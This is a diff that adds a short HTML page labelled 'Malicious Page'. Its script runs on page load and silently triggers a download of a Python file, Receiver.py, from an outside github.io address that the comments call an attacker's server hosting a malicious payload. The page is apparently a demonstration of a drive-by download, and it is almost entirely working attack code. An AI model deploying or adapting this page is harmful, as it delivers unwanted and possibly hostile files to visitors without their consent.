@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <script>
+        // Malicious script example
+        // Automatically download a file from an attacker’s server
+        window.onload = function() {
+            var link = document.createElement('a');
+            link.href = 'https://gamingregory112.github.io/Receiver.py';  // URL of the malicious payload
+            link.download = 'Receiver.py';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
+</body>
+</html>
